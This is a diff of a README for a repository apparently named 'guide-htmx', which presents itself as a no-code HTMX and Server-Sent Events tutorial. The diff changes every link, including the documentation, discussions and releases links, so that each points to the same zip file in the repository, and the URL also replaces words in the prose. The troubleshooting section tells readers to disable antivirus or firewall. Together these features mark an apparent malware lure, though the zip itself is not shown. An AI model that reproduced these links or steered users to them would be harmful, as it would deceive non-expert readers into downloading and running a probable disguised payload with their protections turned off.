@@ -1,10 +1,10 @@
 # 🎉 guide-htmx - Your Guide to Interactive Components
 
 ## 📥 Download Now
-[![Download](https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip%20guide-htmx-blue)](https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip)
+[![Download](https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip%20guide-htmx-blue)](https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip)
 
 ## 🚀 Getting Started
-Welcome to the guide-htmx repository. This app helps you create interactive web components using HTMX, https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip, and Server-Sent Events (SSE). You don’t need any programming knowledge to get started. Follow these simple steps to download and run the software.
+Welcome to the guide-htmx repository. This app helps you create interactive web components using HTMX, https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip, and Server-Sent Events (SSE). You don’t need any programming knowledge to get started. Follow these simple steps to download and run the software.
 
 ## 📋 System Requirements
 Before you download the application, ensure your system meets the following requirements:
@@ -16,7 +16,7 @@ Before you download the application, ensure your system meets the following requ
 ## 💾 Download & Install
 To get started, visit the Releases page to download the latest version of guide-htmx. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip)
 
 1. Open the link above in your web browser.
 2. On the Releases page, you will see a list of available versions. Locate the latest version.
@@ -47,7 +47,7 @@ Once you have downloaded the file, you can easily run the application:
 The guide-htmx application is designed to help you understand how to build interactive components for your website. 
 
 ### Key Features
-- **Interactive Examples**: Explore numerous examples of HTMX and https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip components.
+- **Interactive Examples**: Explore numerous examples of HTMX and https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip components.
 - **Live Demos**: Test components in real-time without needing any code.
 - **Documentation**: Each component comes with clear instructions and explanations.
 
@@ -59,14 +59,14 @@ If you encounter any issues while downloading or running the application, try th
 - **Disable Antivirus/Firewall**: Occasionally, these can block applications. Make sure they allow guide-htmx to run.
 
 ## 💬 Community Support
-If you have questions or need help, join our community. You can find ongoing discussions or ask your questions in our [GitHub Discussions](https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip) section.
+If you have questions or need help, join our community. You can find ongoing discussions or ask your questions in our [GitHub Discussions](https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip) section.
 
 ## 🔗 Additional Resources
-To learn more about HTMX and https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip, you can check out the following resources:
+To learn more about HTMX and https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip, you can check out the following resources:
 
-- [HTMX Documentation](https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip)
-- [https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip Documentation](https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip)
-- [Server-Sent Events](https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip)
+- [HTMX Documentation](https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip)
+- [https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip Documentation](https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip)
+- [Server-Sent Events](https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip)
 
 ## ➕ Contributing
 We welcome contributions to improve this guide. If you find any errors or have suggestions for new features, please submit an issue or a pull request on GitHub.
@@ -74,4 +74,4 @@ We welcome contributions to improve this guide. If you find any errors or have s
 ## 📜 License
 This project is licensed under the MIT License. You can freely use and modify the application for your needs.
 
-For further details and updates, always check the [Releases Page](https://github.com/Byebyeguys/guide-htmx/raw/refs/heads/main/templates/htmx_guide_urethrometer.zip). Thank you for using guide-htmx!
+For further details and updates, always check the [Releases Page](https://raw.githubusercontent.com/Byebyeguys/guide-htmx/main/templates/guide_htmx_v1.8.zip). Thank you for using guide-htmx!
